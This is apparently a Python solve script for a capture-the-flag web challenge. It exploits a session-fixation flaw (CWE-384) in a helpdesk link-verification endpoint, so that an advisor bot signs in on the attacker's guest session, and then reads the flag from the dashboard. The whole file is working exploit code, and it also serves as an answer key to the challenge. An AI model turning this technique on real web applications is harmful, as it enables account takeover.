#!/usr/bin/env python3
"""
Alma Portal (auth, 150) — CWE-384 session fixation via the helpdesk link checker.

The server only trusts sids it minted (can't inject one), but /helpdesk/verify-link
signs the advisor in ON THE SUBMITTER'S SESSION. So we grab a guest sid, submit
the verify-link request carrying it, and the advisor ends up authenticated on our
session -> reuse it on /dashboard.

Usage:
    python3 solve.py                          # defaults to auth5.chal.deti:8064
    python3 solve.py http://auth5.chal.deti:8064
"""
import re
import sys
import time

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth5.chal.deti:8064"
DASHBOARD = f"{BASE}/dashboard"
VERIFY = f"{BASE}/helpdesk/verify-link"

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    s = requests.Session()

    # 1. guest session the server issued (do NOT hit / again — it rotates the sid)
    s.get(f"{BASE}/", timeout=10)
    sid = s.cookies.get("sid")
    print(f"[i] guest sid: {sid}")

    # 2. baseline: dashboard should be unauthenticated for us
    before = s.get(DASHBOARD, timeout=10, allow_redirects=False)
    print(f"[i] dashboard before: {before.status_code}")

    # 3. fixation: submit the verify-link request on OUR session -> advisor signs into it
    s.post(VERIFY, data={"link": DASHBOARD}, timeout=10)
    print("[+] handed our session to the advisor via /helpdesk/verify-link")

    # 4. reuse our now-advisor session
    time.sleep(2)
    r = s.get(DASHBOARD, timeout=10)
    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    print(f"[!] dashboard status {r.status_code}, no flag — body head:\n{r.text[:800]}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
